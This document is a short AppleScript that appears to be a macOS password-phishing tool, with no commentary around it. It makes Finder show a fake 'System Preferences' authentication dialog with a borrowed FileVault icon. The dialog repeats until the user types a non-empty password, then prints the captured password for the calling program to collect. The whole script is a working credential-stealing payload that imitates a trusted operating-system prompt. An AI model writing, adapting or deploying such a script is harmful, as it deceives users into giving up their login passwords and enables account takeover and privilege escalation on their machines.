on run argv

tell application "Finder"
    activate
    set myprompt to "Type your password to allow " & (item 1 of argv) & " System Preferences to make changes"
                
    set ans to "Cancel"
    repeat
        try
            set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "FileVaultIcon.icns" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
            set ans to button returned of d_returns
            set mypass to text returned of d_returns
            if mypass > "" then exit repeat
        end try
    end repeat
                
    try
        do shell script "echo " & quoted form of mypass
    end try
end tell
